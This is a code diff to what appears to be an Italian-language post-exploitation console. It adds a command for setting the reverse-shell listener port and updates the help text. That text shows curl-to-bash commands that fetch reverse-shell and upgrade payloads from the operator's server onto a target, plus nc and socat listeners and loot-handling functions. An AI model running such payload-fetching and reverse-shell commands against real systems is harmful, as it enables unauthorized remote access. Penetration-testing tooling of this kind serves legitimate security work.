@@ -18,6 +18,7 @@ from shutil import get_terminal_size, which
 
 from http_server import start as _serve_start, stop as _serve_stop, status as _serve_status, fetch_tools as _serve_fetch, list_static as _serve_list_static, discover_interfaces as _serve_discover_interfaces, get_web_url as _serve_get_url, list_loot as _serve_list_loot, read_loot as _serve_read_loot, clear_loot as _serve_clear_loot, LOOT_ROOT
 from http_server import tunnel_fetch as _tunnel_fetch, tunnel_start as _tunnel_start, tunnel_stop as _tunnel_stop, tunnel_status as _tunnel_status, tunnel_list as _tunnel_list
+from http_server import set_lport as _set_lport
 
 try:
     import readline  # type: ignore
@@ -1298,6 +1299,7 @@ Serve payload dinamici e file statici via `curl` dal target.
 | `serve status` | Mostra stato corrente |
 | `serve fetch [--force]` | Scarica i tool di post-exploitation in `static/` |
 | `serve list` | Elenca i file in `static/` |
+| `serve lport [porta]` | Mostra o cambia la porta per le reverse shell |
 
 ## Categorie di help
 
@@ -1328,7 +1330,7 @@ curl http://<LHOST>:2727/upgrade | bash
 Avvia un listener **socat** sulla tua macchina prima di lanciare il curl:
 
 ```bash
-socat file:$(tty),raw,echo=0 tcp-listen:4444
+socat file:$(tty),raw,echo=0 tcp-listen:<LPORT>
 ```
 
 ## Cosa fa lo script
@@ -1405,7 +1407,7 @@ curl http://<LHOST>:2727/rev | bash
 Listener sulla tua macchina:
 
 ```bash
-nc -lvnp 4444
+nc -lvnp <LPORT>
 ```
 
 ## Payload generato
@@ -1433,7 +1435,7 @@ curl http://<LHOST>:2727/sh | bash
 ## Prerequisito
 
 ```bash
-nc -lvnp 4444
+nc -lvnp <LPORT>
 ```
 
 ## Quando usarlo
@@ -1601,6 +1603,20 @@ def cmd_serve(args: argparse.Namespace, state: ConsoleState | None = None) -> in
         return 0
     if action in {"list", "ls"}:
         print(_serve_list_static())
+        return 0
+    if action == "lport":
+        subtopic = getattr(args, "subtopic", None)
+        if subtopic:
+            try:
+                port = int(subtopic)
+            except ValueError:
+                print(f"Porta non valida: {subtopic}")
+                return 1
+            print(_set_lport(port))
+        else:
+            from http_server import _lport
+            print(f"LPORT attuale: \033[96m{_lport}\033[0m")
+            print(f"  Cambia con: \033[93mserve lport <porta>\033[0m")
         return 0
     print(_serve_status())
     return 0
